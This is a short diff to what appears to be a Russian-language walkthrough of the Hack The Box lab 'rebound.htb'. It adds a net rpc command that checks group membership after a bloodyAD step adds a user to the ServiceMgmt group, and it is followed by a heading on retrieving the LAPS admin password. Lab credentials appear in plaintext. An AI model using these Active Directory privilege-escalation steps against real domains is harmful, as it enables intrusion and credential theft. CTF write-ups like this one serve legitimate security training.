@@ -472,6 +472,8 @@ pip3 install -r requirements.txt
 
 ./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add groupMember ServiceMgmt oorend		((Добавить пользователя в группу))
 
+net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "dc01.REBOUND.HTB"		(проверка членов группы)
+
 
  # Получение пароля LAPS Admin
 
